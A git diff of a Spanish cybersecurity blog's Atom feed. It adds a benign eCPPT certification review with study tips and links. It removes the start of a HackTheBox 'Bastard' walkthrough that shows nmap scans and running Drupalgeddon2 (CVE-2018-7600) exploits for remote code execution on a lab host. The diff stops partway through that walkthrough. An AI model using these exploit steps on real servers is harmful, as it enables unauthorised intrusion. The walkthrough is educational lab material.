@@ -1,4 +1,123 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-08-17T01:27:41-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Bast1ant1c</title><subtitle>Blog de Ciberseguridad</subtitle><author><name>BAST1ANT1C</name></author><entry><title type="html">SafeWebHeaders.py</title><link href="http://localhost:4000/safewebheaders/" rel="alternate" type="text/html" title="SafeWebHeaders.py" /><published>2023-04-12T00:00:00-05:00</published><updated>2023-04-12T00:00:00-05:00</updated><id>http://localhost:4000/safewebheaders</id><content type="html" xml:base="http://localhost:4000/safewebheaders/">&lt;p style=&quot;text-align: center;&quot;&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-08-23T13:34:52-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Bast1ant1c</title><subtitle>Blog de Ciberseguridad</subtitle><author><name>BAST1ANT1C</name></author><entry><title type="html">eCPPT Review</title><link href="http://localhost:4000/ecppt/" rel="alternate" type="text/html" title="eCPPT Review" /><published>2023-08-23T00:00:00-05:00</published><updated>2023-08-23T00:00:00-05:00</updated><id>http://localhost:4000/ecppt</id><content type="html" xml:base="http://localhost:4000/ecppt/">&lt;p style=&quot;text-align: center;&quot;&gt;
+&lt;img src=&quot;/assets/images/ecppt/ecppt.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;¡Hola!
+Vengo a contar mi experiencia de como logré adquirir el certificado de &lt;em&gt;“eLearnSecurity Certified Professional Penetration Tester”&lt;/em&gt; &lt;strong&gt;(eCPPT)&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;He dividido en &lt;strong&gt;6&lt;/strong&gt; secciones lo que pude identificar, para cada una de las fases de mi preparación antes, durante y después del &lt;strong&gt;examen&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;Espero le sirva a la persona que está leyendo, así como a mí me sirvieron algunos &lt;strong&gt;reviews&lt;/strong&gt; que leí en su momento.&lt;/p&gt;
+
+&lt;p&gt;Seré breve en todas las secciones para no saturarlos de información.&lt;/p&gt;
+
+&lt;h2 id=&quot;pre-requisitos&quot;&gt;PRE-REQUISITOS&lt;/h2&gt;
+
+&lt;p&gt;Realmente aconsejo hacer un plan de estudio, llévalo a tu ritmo, prepárate con calma, disfruta lo que haces, porque estas aprendiendo para tu futuro, no solo para un examen.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Organiza tu &lt;strong&gt;tiempo&lt;/strong&gt; y mantente constante, será de gran ayuda!&lt;/li&gt;
+  &lt;li&gt;Lleva unos &lt;strong&gt;apuntes&lt;/strong&gt;, ya sea en hojas o en un PC (Sublime en mi caso).&lt;/li&gt;
+  &lt;li&gt;Se proactivo, investiga, lee, mantente &lt;strong&gt;actualizado&lt;/strong&gt;.&lt;/li&gt;
+  &lt;li&gt;Planifica una &lt;strong&gt;meta&lt;/strong&gt;, una fecha o una ocasión especial para hacer el examen.&lt;/li&gt;
+  &lt;li&gt;Si puedes &lt;strong&gt;explicarle&lt;/strong&gt; a alguien lo que has aprendido, te ayudara bastante a entender un poco más.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;preparación&quot;&gt;PREPARACIÓN&lt;/h2&gt;
+
+&lt;p&gt;Considero que para la eCPPT tienes una cantidad de información de &lt;strong&gt;calidad&lt;/strong&gt; a la mano, apóyate en tus colegas, grupos, internet, libros si es necesario, como mejor te sientas para lograr entender lo que estas aprendiendo, no hay un camino correcto, &lt;strong&gt;todos llegamos a un mismo destino&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;A comparación de mi experiencia con la &lt;a href=&quot;https://bast1ant1c.github.io/ejpt&quot;&gt;eJPT&lt;/a&gt;, considero que esta certificación es de mucha más complejidad, &lt;strong&gt;no por esto es algo imposible&lt;/strong&gt;, es solo que debes estudiar un poco más, el &lt;strong&gt;pivoting&lt;/strong&gt; es la clave en este examen, mantener la calma y tomarte el tiempo necesario hace que vaya de la mejor manera, incluso que disfrutes la experiencia, no dejes de lado la documentación, recuerda que en esta ocasión no respondes preguntas, realizas un informe técnico, así que presta mucha atención a los requisitos de ese informe.&lt;/p&gt;
+
+&lt;p&gt;Dejaré los temas que son evaluados en la eCPPT:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;TCP/IP.&lt;/li&gt;
+  &lt;li&gt;Pivoting.&lt;/li&gt;
+  &lt;li&gt;Metodología de pentesting.&lt;/li&gt;
+  &lt;li&gt;Escaneo/Reconocimiento de dispositivos.&lt;/li&gt;
+  &lt;li&gt;Análisis de vulnerabilidades web e infraestructura.&lt;/li&gt;
+  &lt;li&gt;Explotación de vulnerabilidades.&lt;/li&gt;
+  &lt;li&gt;Buffer overflow.&lt;/li&gt;
+  &lt;li&gt;Uso de hacktools.&lt;/li&gt;
+  &lt;li&gt;Elaboración de informes.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;tips&quot;&gt;TIPS&lt;/h2&gt;
+
+&lt;p&gt;El mejor consejo que puedo dar para esta certificación es estar preparado en todos los sentidos, te va a ayudar a concentrarte en el examen, así que te voy a dejar algunas de las cosas que preparé antes de iniciar:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Recuerda tus &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;credenciales de la VPN&lt;/code&gt; de INE, cometí el error de iniciar el examen y no recordaba esta credencial, por lo que tuve que realizar un reinicio del entorno, esto debido a que tuve que renovar las credenciales y volver a descargar la VPN, perdiendo tiempo del examen.&lt;/li&gt;
+  &lt;li&gt;Ten lo más lista posible la &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;plantilla de tu informe&lt;/code&gt;, voy a recomendar el documento que la mayoría utiliza, incluyéndome, la verdad es que la plantilla de &lt;a href=&quot;https://github.com/hmaverickadams/TCM-Security-Sample-Pentest-Report&quot;&gt;TCM&lt;/a&gt; es bastante completa y funciona excelente, personaliza lo que desees y entiende todo su funcionamiento antes de iniciar el examen, te ayudará mejorar tu tiempo y enfocarte en lo principal.&lt;/li&gt;
+  &lt;li&gt;Alista tus &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;notas&lt;/code&gt; con la aplicación de preferencia, es importante que tomes evidencias en cada proceso que ejecutas, yo tenía notas en Sublime y tenía listo Obsidian para iniciar a tomar notas del examen, para las evidencias tenía un Word dividido por títulos en donde incluía todas las capturas de pantalla.&lt;/li&gt;
+  &lt;li&gt;Puedo decir que la mayor parte de mi preparación fue con una &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;serie de videos&lt;/code&gt; del canal secundario de &lt;a href=&quot;https://www.youtube.com/@S4viOnLive&quot;&gt;S4vitar&lt;/a&gt; de pivoting, videos donde explotaba 2 o 3 máquinas, una tras de otra, explicando conceptos de &lt;strong&gt;pivoting&lt;/strong&gt; y explotación al mismo tiempo, veía los videos y tomaba notas de cada uno de ellos, luego emulaba los laboratorios y continuaba con el siguiente video, hasta completar los 5 videos.&lt;/li&gt;
+  &lt;li&gt;En el video de &lt;a href=&quot;https://youtu.be/Q7UeWILja-g&quot;&gt;Simulación de examen eCPPTv2&lt;/a&gt; se explica la resolución de la maquina &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Brainpan (Buffer overflow)&lt;/code&gt;, te recomiendo especial atención esta máquina porque va a ayudarte en conceptos y explotaciones de este tipo, fundamentales para el examen.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;el-examen&quot;&gt;EL EXAMEN&lt;/h2&gt;
+
+&lt;p&gt;Tienes &lt;strong&gt;14&lt;/strong&gt; días para realizar el examen (7 laboratorio y 7 informe) y necesitas de una VPN en tu máquina, procura tener buen internet, conectado por cable si es posible, compra algo de comer, algo de tomar, pon música, despliega todas tus notas, duerme bien el día anterior y escoge la mejor hora y fecha para realizar la certificación, si estas tranquilo, todo va a salir bien, no te presiones, tienes bastante tiempo, ten en cuenta que no es un CTF, enfócate en lo que te pide la carta de inicio y no solo en vulnerar todos los sistemas hasta que seas un usuario administrador.&lt;/p&gt;
+
+&lt;p&gt;Recuerda que estás haciendo un pentesting, debes consolidar todos los requerimientos que te dan en un informe, recuerda los conceptos de &lt;strong&gt;pivoting&lt;/strong&gt;, &lt;strong&gt;buffer overflow&lt;/strong&gt; y &lt;strong&gt;explotación web&lt;/strong&gt; porque es muy importante tenerlos claros y, por último, sácale el mayor provecho, aprende mucho, &lt;strong&gt;diviértete&lt;/strong&gt; y comparte tu conocimiento, ¡alguien más te lo agradecerá!&lt;/p&gt;
+
+&lt;p&gt;Ítems claves de la certificación:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Carta de presentación: Lee con atención todos los requerimientos.&lt;/li&gt;
+  &lt;li&gt;Duración: 14 días (7 laboratorio y 7 informe).&lt;/li&gt;
+  &lt;li&gt;Informe final.&lt;/li&gt;
+  &lt;li&gt;Estudia pivoting.&lt;/li&gt;
+  &lt;li&gt;Estudia Buffer overflow.&lt;/li&gt;
+  &lt;li&gt;Ten presente tus notas.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;extras&quot;&gt;EXTRAS&lt;/h2&gt;
+
+&lt;p&gt;Te dejare &lt;strong&gt;algunos&lt;/strong&gt; links que fueron de ayuda para mí, estoy seguro de que van a ayudarte en este proceso:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.youtube.com/@S4viOnLive&quot;&gt;Canal Youtube secundario S4vitar&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/sergiovks/eCPPTv2-Personal-Cheatsheet-ESP-&quot;&gt;Cheat sheet sergiovks&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://deephacking.tech/que-es-el-pivoting/&quot;&gt;Pivoting concept 1&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://highon.coffee/blog/ssh-meterpreter-pivoting-techniques/&quot;&gt;Pivoting concept 2&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://sansorg.egnyte.com/dl/kZpaAx3eX0&quot;&gt;Pivoting concept 3&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.ctfwriteup.com/red-teaming/tcm-linux-privilege-escalation-course/tryhackme-brainpan-1-hard&quot;&gt;Buffer Overflow&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://bast1ant1c.github.io/blue/&quot;&gt;Blue machine&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/hmaverickadams/TCM-Security-Sample-Pentest-Report&quot;&gt;Plantilla informe&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;conclusión&quot;&gt;CONCLUSIÓN&lt;/h2&gt;
+
+&lt;p&gt;La verdad me gusto bastante la certificación, aprendí mucho de metodologías, he terminado la &lt;strong&gt;explotación&lt;/strong&gt; de las maquinas en un total de 2 días y el &lt;strong&gt;informe&lt;/strong&gt; en 3 días, obteniendo éxito en la certificación en menos de &lt;strong&gt;5 días&lt;/strong&gt; de revisión.&lt;/p&gt;
+
+&lt;p&gt;En el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;primer día&lt;/code&gt; logre ingresar a &lt;strong&gt;2 máquinas&lt;/strong&gt;, tome evidencias y deje mis notas al día, cada maquina tiene una pista de la siguiente, todas están conectadas y el objetivo es obtener el usuario root en la red DMZ, para este punto no conocía el segmento de esa red.&lt;/p&gt;
+
+&lt;p&gt;El &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;segundo día&lt;/code&gt; tuve complicaciones con la máquina de buffer overflow, finalmente el error estaba en los detalles, luego de eso logré la explotación de las &lt;strong&gt;maquinas faltantes&lt;/strong&gt; y el acceso &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; a la DMZ.&lt;/p&gt;
+
+&lt;p&gt;Para los siguientes &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;3 días&lt;/code&gt;, realice el informe de una manera más tranquila, descansaba, sin presiones, con todas las capturas de pantalla y lo más detallado posible, recuerda que tu emulas a una empresa y debes entregarle un trabajo a una compañía, entonces trata de hacerlo de la mejor manera, así mismo como si estuvieras en la vida real, el informe habla por ti, es lo que te revisan, haz lo mejor que puedas.&lt;/p&gt;
+
+&lt;p&gt;Las &lt;strong&gt;notas&lt;/strong&gt; que tenía previamente fueron bastante útiles, ayudó mucho practicar &lt;strong&gt;pivoting&lt;/strong&gt; y creo que me falto un poco practicar &lt;strong&gt;buffer overflow&lt;/strong&gt; ya que fue el que más complejidad tuvo en mi experiencia.&lt;/p&gt;
+
+&lt;p&gt;Revisar y dejar a punto la &lt;strong&gt;plantilla del informe&lt;/strong&gt; me ahorró muchísimo tiempo en la documentación, prácticamente me dedique a reportar las vulnerabilidades de la manera más completa posible, siento que fue un punto positivo muy a favor ir preparado de esta manera.&lt;/p&gt;
+
+&lt;p&gt;Un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tip&lt;/code&gt; muy importante con el pivoting, revisa las &lt;strong&gt;versiones&lt;/strong&gt; de Chisel, Socat y netsh, tuve un problema con la primera herramienta, a fin de cuentas, era por una versión del release que no me permitía una ejecución exitosa, pero dejo esto para que no sobre pienses las cosas, muchas veces estamos haciendo las cosas bien, pero estos detalles no hacen encaminarnos a la frustración, es por eso la importancia de practicar estas técnicas, de diferentes maneras, para ir lo mejor preparado posible.&lt;/p&gt;
+
+&lt;p&gt;El examen considero que tiene una gran cantidad de tiempo disponible para poder aprovecharlo al máximo, considero que con los videos del canal secundario de s4vitar es más que suficiente, tendrás todos los conceptos para lograr pasar.&lt;/p&gt;
+
+&lt;p&gt;Yo recomiendo hacer los laboratorios, estudiar y tomar notas de todo, ponerlo en práctica y si es posible explicarles a tus compañeros para que consolides ese conocimiento adquirido.&lt;/p&gt;
+
+&lt;p&gt;Los links de ayuda dan una gran oportunidad de tener guías a la mano para no dejar escapar ningún detalle.&lt;/p&gt;
+
+&lt;p&gt;Leer la carta de presentación es fundamental, al igual que las preguntas, ahí es donde se debe poner especial atención, debes trabajar para lograr ese resultado.&lt;/p&gt;
+
+&lt;p&gt;Por otro lado, come bien, duerme bien, aléjate del PC de vez en cuando, respira, toma aire, sal a caminar un poco, eso oxigena la mente y te dará un nuevo aire para pensar mejor.&lt;/p&gt;
+
+&lt;p&gt;Lo único que puedo decir es que es una excelente certificación para subir un poco el nivel, personalmente me siento muy bien con el trabajo realizado, quería compartir un poco de esta experiencia para que se motiven a hacer la certificación si estas empezando y si ya eres alguien más experimentado, ¡nunca está de más tener un nuevo reto en la vida!&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;¡Que tengan un buen día en el planeta donde se encuentren!&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Nos vemos en otro bit.&lt;/strong&gt;&lt;/p&gt;</content><author><name>BAST1ANT1C</name></author><category term="Pentesting" /><category term="eLearnSecurity" /><summary type="html">¡Hola! Vengo a contar mi experiencia de como logré adquirir el certificado de eLearnSecurity Certified Professional Penetration Tester (eCPPT)</summary></entry><entry><title type="html">SafeWebHeaders.py</title><link href="http://localhost:4000/safewebheaders/" rel="alternate" type="text/html" title="SafeWebHeaders.py" /><published>2023-04-12T00:00:00-05:00</published><updated>2023-04-12T00:00:00-05:00</updated><id>http://localhost:4000/safewebheaders</id><content type="html" xml:base="http://localhost:4000/safewebheaders/">&lt;p style=&quot;text-align: center;&quot;&gt;
 &lt;img src=&quot;/assets/images/safewebheaders/02-tarjeta.png&quot; /&gt;
 &lt;/p&gt;
 
@@ -3514,559 +3633,4 @@ bash-4.3# find / &lt;span class=&quot;nt&quot;&gt;-name&lt;/span&gt; root.txt 2&
 
 &lt;p&gt;&lt;em&gt;¡Que tengan un buen día en el planeta donde se encuentren!&lt;/em&gt;&lt;/p&gt;
 
-&lt;p&gt;&lt;strong&gt;Nos vemos en otro bit.&lt;/strong&gt;.&lt;/p&gt;</content><author><name>BAST1ANT1C</name></author><category term="Writeup" /><category term="Cronos" /><summary type="html">Vamos a resolver la máquina cronos de HackTheBox. ¡Let's hack!</summary></entry><entry><title type="html">HTB bastard</title><link href="http://localhost:4000/bastard/" rel="alternate" type="text/html" title="HTB bastard" /><published>2022-12-07T00:00:00-05:00</published><updated>2022-12-07T00:00:00-05:00</updated><id>http://localhost:4000/bastard</id><content type="html" xml:base="http://localhost:4000/bastard/">&lt;p style=&quot;text-align: center;&quot;&gt;
-&lt;img src=&quot;/assets/images/bastard/02-tarjeta.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;p&gt;¡Hola!
-En esta ocasión vamos a resolver de la máquina &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bastard&lt;/code&gt; de &lt;a href=&quot;https://hackthebox.com/&quot;&gt;HackTheBox&lt;/a&gt;.
-La máquina es nivel “Medium”, sin embargo, el nivel siempre se lo pones tú, al enfrentar estos retos, ¡vamos a ponernos hack!&lt;/p&gt;
-
-&lt;h2 id=&quot;preparación&quot;&gt;PREPARACIÓN&lt;/h2&gt;
-
-&lt;p&gt;Para iniciar nuestra máquina, vamos a crear con nuestra función &lt;a href=&quot;https://bast1ant1c.github.io/mkhack/&quot;&gt;mkhack&lt;/a&gt; un directorio de trabajo con el nombre &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bastard&lt;/code&gt; y los subdirectorios &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;recon&lt;/code&gt; junto con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exploit&lt;/code&gt;, con el objetivo de organizar la información que recopilemos en la realización de la máquina.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mkhack bastard
-&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$/&lt;/span&gt;recon
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;reconocimiento&quot;&gt;RECONOCIMIENTO&lt;/h2&gt;
-
-&lt;p&gt;Accedemos al directorio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;recon&lt;/code&gt; e iniciamos nuestra fase de reconocimiento sobre el objetivo por medio de nuestra utilidad &lt;a href=&quot;https://bast1ant1c.github.io/osping/&quot;&gt;osping&lt;/a&gt; detectando el tipo de sistema operativo basado en el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ttl&lt;/code&gt; &lt;em&gt;time to live&lt;/em&gt; de una traza &lt;strong&gt;ICMP&lt;/strong&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;osping 10.10.10.9
- 
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Detectando sistema operativo ...
-
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] 10.10.10.9 &lt;span class=&quot;nv&quot;&gt;ttl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;127 &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; Windows
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Identificamos que es una maquina &lt;strong&gt;Windows&lt;/strong&gt; debido a su ttl (time to live) correspondiente a 127 (Disminuye en 1 debido a que realiza un salto adicional en el entorno de HackTHeBox).&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;TTL =&amp;gt; 64	Linux&lt;/li&gt;
-  &lt;li&gt;TTL =&amp;gt; 128	Windows&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Continuamos con la enumeración de los &lt;strong&gt;65535&lt;/strong&gt; puertos en la máquina.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 5000 &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; 10.10.10.9 &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; ports | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;open
-80/tcp    open  http
-135/tcp   open  msrpc
-49154/tcp open  unknown
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Luego de identificar los puertos abiertos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;OPEN&lt;/code&gt;, se procede a escanear servicios y versiones que puedan estar en nuestro objetivo.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p80&lt;/span&gt;,135,49154 &lt;span class=&quot;nt&quot;&gt;-sCV&lt;/span&gt; 10.10.10.9 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; versions
-PORT      STATE SERVICE VERSION
-80/tcp    open  http    Microsoft IIS httpd 7.5
-|_http-title: Welcome to 10.10.10.9 | 10.10.10.9
-|_http-server-header: Microsoft-IIS/7.5
-| http-methods: 
-|_  Potentially risky methods: TRACE
-|_http-generator: Drupal 7 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;http://drupal.org&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-| http-robots.txt: 36 disallowed entries &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;15 shown&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
-| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
-| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
-|_/LICENSE.txt /MAINTAINERS.txt
-135/tcp   open  msrpc   Microsoft Windows RPC
-49154/tcp open  msrpc   Microsoft Windows RPC
-Service Info: OS: Windows&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;reconocimiento-web&quot;&gt;RECONOCIMIENTO WEB&lt;/h2&gt;
-
-&lt;p&gt;Iniciamos con el reconocimiento del servicio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;web&lt;/code&gt; donde inicialmente, por medio de la utilidad &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;whatweb&lt;/code&gt; enumeramos información de librerías, gestores de contenido, entre otros.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;whatweb 10.10.10.9
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#OUTPUT&lt;/span&gt;
-http://10.10.10.9 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;200 OK] Content-Language[en], Country[RESERVED][ZZ], Drupal, HTTPServer[Microsoft-IIS/7.5], IP[10.10.10.9], JQuery, MetaGenerator[Drupal 7 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;http://drupal.org&lt;span class=&quot;o&quot;&gt;)]&lt;/span&gt;, Microsoft-IIS[7.5], PHP[5.3.28,], PasswordField[pass], Script[text/javascript], Title[Welcome to 10.10.10.9 | 10.10.10.9], UncommonHeaders[x-content-type-options,x-generator], X-Frame-Options[SAMEORIGIN], X-Powered-By[PHP/5.3.28, ASP.NET]
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;rce-por-drupageddon2&quot;&gt;RCE POR DRUPAGEDDON2&lt;/h2&gt;
-
-&lt;p&gt;Hacemos uso de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;searchsploit&lt;/code&gt; buscando potenciales maneras de intrusión por medio de la explotación de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Drupal 7.x&lt;/code&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;searchsploit drupal 7.x
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#OUTPUT&lt;/span&gt;
-Drupal &amp;lt; 7.58 / &amp;lt; 8.3.9 / &amp;lt; 8.4.6 / &amp;lt; 8.5.1 - &lt;span class=&quot;s1&quot;&gt;'Drupalgeddon2'&lt;/span&gt; Remote Code Execution	| php/webapps/44449.rb
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Vamos a ubicarnos en la carpeta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exploit&lt;/code&gt; y a descargar el exploit &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;php/webapps/44449.rb&lt;/code&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; ../exploit
-searchsploit &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; php/webapps/44449.rb
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ejecutamos el exploit agregando únicamente el objetivo en cuestión, sin embargo, se debe instalar la gema &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;highline&lt;/code&gt; para que funcione correctamente y obtener una ejecución remota de comandos como el usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;iusr&lt;/code&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;gem &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;highline
-ruby 44449.rb http://10.10.10.9
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#OUTPUT&lt;/span&gt;
-drupalgeddon2&amp;gt;&amp;gt; &lt;span class=&quot;nb&quot;&gt;whoami
-&lt;/span&gt;nt authority&lt;span class=&quot;se&quot;&gt;\i&lt;/span&gt;usr
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;rce-por-cve-2018-7600&quot;&gt;RCE POR CVE-2018-7600&lt;/h2&gt;
-
-&lt;p&gt;Otro método de intrusión se puede ejecutar por medio del &lt;a href=&quot;https://github.com/pimps/CVE-2018-7600&quot;&gt;script&lt;/a&gt; en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;python&lt;/code&gt; del github de &lt;a href=&quot;https://github.com/pimps&quot;&gt;pimps&lt;/a&gt;, por lo que se procede a descargar el repositorio y asignando como argumentos la URL y el comando que se desea ejecutar, tenemos acceso como usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;iusr&lt;/code&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git clone https://github.com/pimps/CVE-2018-7600
